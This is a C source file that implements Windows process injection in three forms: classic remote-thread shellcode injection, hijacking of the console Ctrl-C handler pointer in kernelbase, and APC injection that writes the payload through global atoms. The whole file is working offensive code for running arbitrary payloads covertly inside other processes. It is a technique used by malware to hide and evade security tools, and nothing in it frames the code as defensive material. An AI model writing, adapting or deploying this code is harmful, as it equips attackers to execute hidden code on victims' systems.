#include "Win32Helper.h"

DWORD ProcessInjectionMain(_In_ PPROCESS_INJECTION_INFORMATION Pii)
{
	DWORD dwReturn = ERROR_SUCCESS;
	HANDLE hHandle = NULL;
	LPVOID BaseAddress = NULL;
	HANDLE hThread = NULL;
	BOOL bFlag = FALSE;

	switch (Pii->MethodEnum)
	{
		case E_WRITEPROCESSMEMORY_CREATEREMOTETHREAD_EXECUTESHELLCODE:
		{
			hHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pii->ProcessId);
			if (hHandle == NULL)
				break;

			BaseAddress = VirtualAllocEx(hHandle, NULL, Pii->dwLengthOfPayloadInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (BaseAddress == NULL)
				break;

			if (!SetProcessPrivilegeToken(0))
				break;

			if (!WriteProcessMemory(hHandle, BaseAddress, Pii->Payload, Pii->dwLengthOfPayloadInBytes, NULL))
				break;

			hThread = CreateRemoteThread(hHandle, NULL, 0, (LPTHREAD_START_ROUTINE)BaseAddress, NULL, 0, NULL);
			if (hThread == NULL)
				break;

			WaitForSingleObject(hThread, INFINITE);

			bFlag = TRUE;

			break;
		}
		
		case E_CTRL_INJECT: //console applications only
		{
			DWORD ConsoleAttachList[2] = { 0 };
			DWORD ParentId = 0;
			PVOID EncodedAddress = NULL;
			INPUT Input = { 0 };
			MODULEINFO KernelbaseInformation = { 0 };
			HWND hWindow = NULL;
			HMODULE KernelBase = NULL, hModule = NULL;
			RTLENCODEREMOTEPOINTER RtlEncodeRemotePointer = NULL;
			DWORD64 Encoded = 0;

			PCHAR KernelBaseDefaultHandler = NULL;
			PCHAR KernelBaseSingleHandler = NULL;

			KernelBase = GetModuleHandleEx2W(L"kernelbase.dll");
			hModule = GetModuleHandleEx2W(L"ntdll.dll");

			if (!KernelBase || !hModule)
				break;

			RtlEncodeRemotePointer = (RTLENCODEREMOTEPOINTER)GetProcAddressA((DWORD64)hModule, "RtlEncodeRemotePointer");
			if (RtlEncodeRemotePointer == NULL)
				break;

			if (!K32GetModuleInformation(InlineGetCurrentProcess, KernelBase, &KernelbaseInformation, sizeof(KernelbaseInformation)))
				break;

			KernelBaseDefaultHandler = (PCHAR)MemoryFindMemory(KernelBase, KernelbaseInformation.SizeOfImage, (PVOID)"\x48\x83\xec\x28\xb9\x3a\x01\x00\xc0", 9);
			if (KernelBaseDefaultHandler == NULL)
				break;

			Encoded = (DWORD64)EncodePointer(KernelBaseDefaultHandler);
			if (Encoded == 0)
				break;

			KernelBaseSingleHandler = (PCHAR)MemoryFindMemory(KernelBase, KernelbaseInformation.SizeOfImage, &Encoded, 8);
			if (KernelBaseSingleHandler == NULL)
				break;

			if (GetConsoleProcessList(ConsoleAttachList, 2) < 2)
				break;

			if (ConsoleAttachList[0] != GetCurrentProcessIdFromTeb())
				ParentId = ConsoleAttachList[0];
			else
				ParentId = ConsoleAttachList[1];

			FreeConsole();
			AttachConsole(Pii->ProcessId);

			hWindow = GetConsoleWindow();

			FreeConsole();
			AttachConsole(ParentId);

			hHandle = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, Pii->ProcessId);

			BaseAddress = VirtualAllocEx(hHandle, NULL, Pii->dwLengthOfPayloadInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (BaseAddress == NULL)
				break;

			if (!WriteProcessMemory(hHandle, BaseAddress, Pii->Payload, Pii->dwLengthOfPayloadInBytes, NULL))
				break;

			CloseHandle(hHandle);

			hHandle = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, Pii->ProcessId); // PROCESS_VM_OPERATION is required for RtlEncodeRemotePointer
			if (hHandle == NULL)
				break;

			RtlEncodeRemotePointer(hHandle, BaseAddress, &EncodedAddress);

			if (!WriteProcessMemory(hHandle, KernelBaseSingleHandler, &EncodedAddress, 8, NULL))
				break;

			Input.type = INPUT_KEYBOARD;
			Input.ki.wScan = 0;
			Input.ki.time = 0;
			Input.ki.dwExtraInfo = 0;
			Input.ki.wVk = VK_CONTROL;
			Input.ki.dwFlags = 0; // 0 for key press

			SendInput(1, &Input, sizeof(INPUT));
			Sleep(100);

			PostMessageA(hWindow, WM_KEYDOWN, 'C', 0);

			Sleep(100);

			Input.type = INPUT_KEYBOARD;
			Input.ki.wScan = 0;
			Input.ki.time = 0;
			Input.ki.dwExtraInfo = 0;
			Input.ki.wVk = VK_CONTROL;
			Input.ki.dwFlags = KEYEVENTF_KEYUP;
			SendInput(1, &Input, sizeof(INPUT));

			RtlEncodeRemotePointer(hHandle, KernelBaseDefaultHandler, &EncodedAddress);
			WriteProcessMemory(hHandle, KernelBaseSingleHandler, &EncodedAddress, 8, NULL);

			bFlag = TRUE;
			break;
		}

		case E_QUEUE_USER_APC: //must use EBFB variant
		{
			NTQUEUEAPCTHREAD NtQueueApcThread = NULL;
			HMODULE hModule = NULL;
			ATOM Alpha = ERROR_SUCCESS, Bravo = ERROR_SUCCESS;
			PCHAR pPayload = (PCHAR)Pii->Payload;

			hModule = GetModuleHandleEx2W(L"ntdll.dll");
			if (hModule == NULL)
				break;

			NtQueueApcThread = (NTQUEUEAPCTHREAD)GetProcAddressA((DWORD64)hModule, "NtQueueApcThread");
			if (!NtQueueApcThread)
				break;

			hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, Pii->ThreadId);
			if (hThread == NULL)
				break;

			hHandle = OpenProcess(0x001fffff, FALSE, GetProcessIdOfThread(hThread));
			if (hHandle == NULL)
				break;

			BaseAddress = VirtualAllocEx(hHandle, NULL, Pii->dwLengthOfPayloadInBytes, 0x00003000, 0x00000040);
			if (BaseAddress == NULL)
				break;

			Bravo = GlobalAddAtomA("b");
			if (Bravo == 0)
				break;

			if (pPayload[0] == '\0')
				break;

			for (DWORD64 Position = Pii->dwLengthOfPayloadInBytes - 1; Position > 0; Position--)
			{
				if ((pPayload[Position] == '\0') && (pPayload[Position - 1] == '\0'))
					NtQueueApcThread(hThread, GlobalGetAtomNameA, (PVOID)Bravo, (PVOID)(((DWORD64)BaseAddress) + Position - 1), (PVOID)2);
			}

			for (PCHAR Position = pPayload; Position < (pPayload + Pii->dwLengthOfPayloadInBytes); Position += strlen(Position) + 1)
			{
				if (*Position == '\0')
					continue;

				Alpha = GlobalAddAtomA(Position);
				if (Alpha == 0)
					break;

				NtQueueApcThread(hThread, GlobalGetAtomNameA, (PVOID)Alpha, (PVOID)(((DWORD64)BaseAddress) + (Position - pPayload)), (PVOID)(strlen(Position) + 1));
			}

			QueueUserAPC((PAPCFUNC)BaseAddress, hThread, 0);

		}

		default:
			break;
	}

	if (!bFlag)
		dwReturn = GetLastErrorFromTeb();
		
	if (hThread)
		CloseHandle(hThread);

	if (hHandle)
		CloseHandle(hHandle);

	return dwReturn;
}